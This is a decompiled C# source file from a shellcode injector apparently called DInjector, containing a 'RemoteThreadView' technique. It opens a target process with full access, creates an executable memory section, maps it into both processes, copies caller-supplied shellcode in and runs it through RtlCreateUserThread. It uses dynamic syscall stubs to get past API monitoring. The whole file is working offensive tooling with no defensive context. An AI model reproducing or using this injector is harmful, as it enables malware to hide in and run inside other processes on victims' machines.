using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x02000015 RID: 21
	internal class RemoteThreadView
	{
		// Token: 0x0600003C RID: 60 RVA: 0x00004D08 File Offset: 0x00002F08
		public static DInvoke.Data.Native.NTSTATUS rtlCreateUserThread(IntPtr ProcessHandle, IntPtr ThreadSecurity, bool CreateSuspended, int StackZeroBits, IntPtr StackReserved, IntPtr StackCommit, IntPtr StartAddress, IntPtr Parameter, ref IntPtr ThreadHandle, IntPtr ClientId)
		{
			object[] array = new object[]
			{
				ProcessHandle,
				ThreadSecurity,
				CreateSuspended,
				StackZeroBits,
				StackReserved,
				StackCommit,
				StartAddress,
				Parameter,
				ThreadHandle,
				ClientId
			};
			DInvoke.Data.Native.NTSTATUS result = (DInvoke.Data.Native.NTSTATUS)Generic.DynamicAPIInvoke("ntdll.dll", "RtlCreateUserThread", typeof(RemoteThreadView.RtlCreateUserThread), ref array, false, true);
			ThreadHandle = (IntPtr)array[8];
			return result;
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00004DAC File Offset: 0x00002FAC
		public static void Execute(byte[] shellcodeBytes, int processID)
		{
			RemoteThreadView.NtOpenProcess ntOpenProcess = (RemoteThreadView.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtOpenProcess"), typeof(RemoteThreadView.NtOpenProcess));
			IntPtr zero = IntPtr.Zero;
			RemoteThreadView.OBJECT_ATTRIBUTES object_ATTRIBUTES = default(RemoteThreadView.OBJECT_ATTRIBUTES);
			RemoteThreadView.CLIENT_ID client_ID = new RemoteThreadView.CLIENT_ID
			{
				UniqueProcess = (IntPtr)processID
			};
			DInvoke.Data.Native.NTSTATUS ntstatus = ntOpenProcess(ref zero, Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, ref object_ATTRIBUTES, ref client_ID);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadView) [+] NtOpenProcess");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadView) [-] NtOpenProcess: {0}", ntstatus));
			}
			RemoteThreadView.NtCreateSection ntCreateSection = (RemoteThreadView.NtCreateSection)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtCreateSection"), typeof(RemoteThreadView.NtCreateSection));
			IntPtr zero2 = IntPtr.Zero;
			uint num = (uint)shellcodeBytes.Length;
			ntstatus = ntCreateSection(ref zero2, Win32.WinNT.ACCESS_MASK.DESKTOP_CREATEWINDOW | Win32.WinNT.ACCESS_MASK.DESKTOP_CREATEMENU | Win32.WinNT.ACCESS_MASK.DESKTOP_HOOKCONTROL, IntPtr.Zero, ref num, 64U, 134217728U, IntPtr.Zero);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadView) [+] NtCreateSection, PAGE_EXECUTE_READWRITE");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadView) [-] NtCreateSection, PAGE_EXECUTE_READWRITE: {0}", ntstatus));
			}
			RemoteThreadView.NtMapViewOfSection ntMapViewOfSection = (RemoteThreadView.NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtMapViewOfSection"), typeof(RemoteThreadView.NtMapViewOfSection));
			IntPtr handle = Process.GetCurrentProcess().Handle;
			IntPtr zero3 = IntPtr.Zero;
			ulong num2;
			ntstatus = ntMapViewOfSection(zero2, handle, ref zero3, UIntPtr.Zero, UIntPtr.Zero, out num2, out num, 2U, 0U, 4U);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_READWRITE");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadView) [-] NtMapViewOfSection, PAGE_READWRITE: {0}", ntstatus));
			}
			IntPtr zero4 = IntPtr.Zero;
			ntstatus = ntMapViewOfSection(zero2, zero, ref zero4, UIntPtr.Zero, UIntPtr.Zero, out num2, out num, 2U, 0U, 32U);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_EXECUTE_READ");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadView) [-] NtMapViewOfSection, PAGE_EXECUTE_READ: {0}", ntstatus));
			}
			Marshal.Copy(shellcodeBytes, 0, zero3, shellcodeBytes.Length);
			RemoteThreadView.RtlCreateUserThread rtlCreateUserThread = (RemoteThreadView.RtlCreateUserThread)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("RtlCreateUserThread"), typeof(RemoteThreadView.RtlCreateUserThread));
			IntPtr zero5 = IntPtr.Zero;
			ntstatus = RemoteThreadView.rtlCreateUserThread(zero, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, zero4, IntPtr.Zero, ref zero5, IntPtr.Zero);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadView) [+] RtlCreateUserThread");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadView) [-] RtlCreateUserThread: {0}", ntstatus));
			}
			((RemoteThreadView.NtUnmapViewOfSection)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtUnmapViewOfSection"), typeof(RemoteThreadView.NtUnmapViewOfSection)))(handle, zero3);
			((RemoteThreadView.NtClose)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtClose"), typeof(RemoteThreadView.NtClose)))(zero2);
		}

		// Token: 0x02000074 RID: 116
		// (Invoke) Token: 0x0600012B RID: 299
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtOpenProcess(ref IntPtr ProcessHandle, Win32.Kernel32.ProcessAccessFlags DesiredAccess, ref RemoteThreadView.OBJECT_ATTRIBUTES ObjectAttributes, ref RemoteThreadView.CLIENT_ID ClientId);

		// Token: 0x02000075 RID: 117
		// (Invoke) Token: 0x0600012F RID: 303
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtCreateSection(ref IntPtr SectionHandle, Win32.WinNT.ACCESS_MASK DesiredAccess, IntPtr ObjectAttributes, ref uint MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

		// Token: 0x02000076 RID: 118
		// (Invoke) Token: 0x06000133 RID: 307
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

		// Token: 0x02000077 RID: 119
		// (Invoke) Token: 0x06000137 RID: 311
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS RtlCreateUserThread(IntPtr ProcessHandle, IntPtr ThreadSecurity, bool CreateSuspended, int StackZeroBits, IntPtr StackReserved, IntPtr StackCommit, IntPtr StartAddress, IntPtr Parameter, ref IntPtr ThreadHandle, IntPtr ClientId);

		// Token: 0x02000078 RID: 120
		// (Invoke) Token: 0x0600013B RID: 315
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);

		// Token: 0x02000079 RID: 121
		// (Invoke) Token: 0x0600013F RID: 319
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtClose(IntPtr hObject);

		// Token: 0x0200007A RID: 122
		private struct OBJECT_ATTRIBUTES
		{
			// Token: 0x04000302 RID: 770
			public int Length;

			// Token: 0x04000303 RID: 771
			public IntPtr RootDirectory;

			// Token: 0x04000304 RID: 772
			public IntPtr ObjectName;

			// Token: 0x04000305 RID: 773
			public uint Attributes;

			// Token: 0x04000306 RID: 774
			public IntPtr SecurityDescriptor;

			// Token: 0x04000307 RID: 775
			public IntPtr SecurityQualityOfService;
		}

		// Token: 0x0200007B RID: 123
		private struct CLIENT_ID
		{
			// Token: 0x04000308 RID: 776
			public IntPtr UniqueProcess;

			// Token: 0x04000309 RID: 777
			public IntPtr UniqueThread;
		}
	}
}
